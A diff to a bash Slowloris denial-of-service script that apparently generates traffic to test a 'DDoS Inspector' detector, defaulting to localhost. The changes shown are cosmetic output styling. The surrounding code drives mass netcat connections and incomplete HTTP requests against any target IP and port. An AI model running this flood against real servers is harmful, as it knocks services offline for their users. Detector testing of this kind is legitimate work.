@@ -3,15 +3,23 @@
 # Enhanced Slowloris Attack Script
 # Now generates attacks intense enough to trigger the harder detection thresholds
 
+# Color definitions
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
 TARGET_IP=${1:-"127.0.0.1"}
 TARGET_PORT=${2:-"80"}
 DURATION=${3:-"300"}  # Increased default duration for slowloris (5 minutes)
 INTENSITY=${4:-"high"}
 
-echo "🐌 Starting Enhanced Slowloris Attack"
-echo "Target: $TARGET_IP:$TARGET_PORT"
-echo "Duration: ${DURATION}s"
-echo "Intensity: $INTENSITY"
+echo -e "${GREEN}[START] Enhanced Slowloris Attack${NC}"
+echo "    Target: $TARGET_IP:$TARGET_PORT"
+echo "    Duration: ${DURATION}s"
+echo "    Intensity: $INTENSITY"
 
 case $INTENSITY in
     "low")
@@ -32,10 +40,10 @@ case $INTENSITY in
         ;;
 esac
 
-echo "📊 Attack Parameters:"
-echo "  - Long-lived connections: $CONNECTIONS"
-echo "  - Incomplete requests: $INCOMPLETE_REQS"
-echo "  - Session duration: ${DURATION}s"
+echo -e "${CYAN}[PARAMETERS] Attack Configuration:${NC}"
+echo "    - Long-lived connections: $CONNECTIONS"
+echo "    - Incomplete requests: $INCOMPLETE_REQS"
+echo "    - Session duration: ${DURATION}s"
 echo ""
 
 # Function to create long-lived HTTP connection
@@ -102,71 +110,71 @@ create_incomplete_request() {
 
 # Check dependencies
 if ! command -v nc &> /dev/null; then
-    echo "⚠️  netcat (nc) not found. Installing..."
+    echo -e "${YELLOW}[WARNING] netcat (nc) not found. Installing...${NC}"
     sudo apt-get update && sudo apt-get install -y netcat
 fi
 
-echo "🎯 Starting Slowloris attack..."
-echo "⏱️  This will run for $DURATION seconds"
+echo -e "${BLUE}[ATTACK] Starting Slowloris attack...${NC}"
+echo -e "${YELLOW}[TIMING] This will run for $DURATION seconds${NC}"
 
 # Arrays to store process IDs for cleanup
 declare -a CONNECTION_PIDS
 declare -a REQUEST_PIDS
 
 # Phase 1: Create long-lived connections
-echo "📡 Creating $CONNECTIONS long-lived connections..."
+echo -e "${CYAN}[CONNECTIONS] Creating $CONNECTIONS long-lived connections...${NC}"
 for ((i=1; i<=CONNECTIONS; i++)); do
     pid=$(create_slowloris_connection $i $TARGET_IP $TARGET_PORT $DURATION)
     CONNECTION_PIDS[$i]=$pid
     
     # Progress indicator
     if [ $((i % 10)) -eq 0 ]; then
-        echo "   Created $i/$CONNECTIONS connections..."
+        echo "    Created $i/$CONNECTIONS connections..."
     fi
     
     # Small delay to avoid overwhelming the target immediately
     sleep 0.1
 done
 
-echo "✅ Created $CONNECTIONS long-lived connections"
+echo -e "${GREEN}[SUCCESS] Created $CONNECTIONS long-lived connections${NC}"
 
 # Phase 2: Create incomplete requests
-echo "📝 Creating $INCOMPLETE_REQS incomplete requests..."
+echo -e "${CYAN}[REQUESTS] Creating $INCOMPLETE_REQS incomplete requests...${NC}"
 for ((i=1; i<=INCOMPLETE_REQS; i++)); do
     pid=$(create_incomplete_request $i $TARGET_IP $TARGET_PORT)
     REQUEST_PIDS[$i]=$pid
     
     # Progress indicator
     if [ $((i % 20)) -eq 0 ]; then
-        echo "   Created $i/$INCOMPLETE_REQS incomplete requests..."
+        echo "    Created $i/$INCOMPLETE_REQS incomplete requests..."
     fi
     
     # Small delay between requests
     sleep 0.05
 done
 
-echo "✅ Created $INCOMPLETE_REQS incomplete requests"
+echo -e "${GREEN}[SUCCESS] Created $INCOMPLETE_REQS incomplete requests${NC}"
 
 # Monitor attack progress
 start_time=$(date +%s)
 echo ""
-echo "🔥 Slowloris attack is now active!"
-echo "💡 Expected detection behavior:"
-echo "   - Need 50+ long sessions AND 100+ incomplete requests"
-echo "   - Current: $CONNECTIONS long sessions, $INCOMPLETE_REQS incomplete requests"
+echo -e "${RED}[ACTIVE] Slowloris attack is now active!${NC}"
+echo -e "${BLUE}[INFO] Expected detection behavior:${NC}"
+echo "    - Need 50+ long sessions AND 100+ incomplete requests"
+echo "    - Current: $CONNECTIONS long sessions, $INCOMPLETE_REQS incomplete requests"
 
 if [ $CONNECTIONS -ge 50 ] && [ $INCOMPLETE_REQS -ge 100 ]; then
-    echo "   ✅ Should trigger detection (both thresholds met)"
+    echo -e "${GREEN}[SUCCESS] Should trigger detection (both thresholds met)${NC}"
 elif [ $CONNECTIONS -ge 50 ]; then
-    echo "   ⚠️  May not trigger (missing incomplete requests threshold)"
+    echo -e "${YELLOW}[WARNING] May not trigger (missing incomplete requests threshold)${NC}"
 elif [ $INCOMPLETE_REQS -ge 100 ]; then
-    echo "   ⚠️  May not trigger (missing long sessions threshold)"
+    echo -e "${YELLOW}[WARNING] May not trigger (missing long sessions threshold)${NC}"
 else
-    echo "   ❌ Should NOT trigger (neither threshold met)"
+    echo -e "${RED}[ERROR] Should NOT trigger (neither threshold met)${NC}"
 fi
 
 # Wait for duration or user interrupt
-trap 'echo "🛑 Received interrupt signal, cleaning up..."; break' INT TERM
+trap 'echo -e "${RED}[STOP] Received interrupt signal, cleaning up...${NC}"; break' INT TERM
 
 while true; do
     current_time=$(date +%s)
@@ -178,13 +186,13 @@ while true; do
     
     remaining=$((DURATION - elapsed))
     active_connections=$(ps aux | grep -c "nc $TARGET_IP $TARGET_PORT" || echo "0")
-    echo "⏳ Attack active... ${remaining}s remaining (active connections: ~$active_connections)"
+    echo -e "${YELLOW}[PROGRESS] Attack active... ${remaining}s remaining (active connections: ~$active_connections)${NC}"
     sleep 10
 done
 
 # Cleanup
 echo ""
-echo "🧹 Cleaning up attack processes..."
+echo -e "${BLUE}[CLEANUP] Cleaning up attack processes...${NC}"
 
 # Kill connection processes
 for pid in "${CONNECTION_PIDS[@]}"; do
@@ -203,14 +211,14 @@ pkill -f "nc $TARGET_IP $TARGET_PORT" 2>/dev/null || true
 sleep 2
 remaining_procs=$(ps aux | grep -c "nc $TARGET_IP $TARGET_PORT" || echo "0")
 if [ "$remaining_procs" -gt 1 ]; then  # grep itself counts as 1
-    echo "⚠️  Force killing remaining processes..."
+    echo -e "${YELLOW}[WARNING] Force killing remaining processes...${NC}"
     pkill -9 -f "nc $TARGET_IP $TARGET_PORT" 2>/dev/null || true
 fi
 
-echo "✅ Slowloris attack completed"
-echo "📊 Attack Summary:"
-echo "   - Duration: ${elapsed}s"
-echo "   - Long connections: $CONNECTIONS"
-echo "   - Incomplete requests: $INCOMPLETE_REQS"
-echo "🔍 Check your DDoS Inspector logs for detection alerts"
+echo -e "${GREEN}[SUCCESS] Slowloris attack completed${NC}"
+echo -e "${CYAN}[SUMMARY] Attack Summary:${NC}"
+echo "    - Duration: ${elapsed}s"
+echo "    - Long connections: $CONNECTIONS"
+echo "    - Incomplete requests: $INCOMPLETE_REQS"
+echo -e "${BLUE}[CHECK] Check your DDoS Inspector logs for detection alerts${NC}"
 
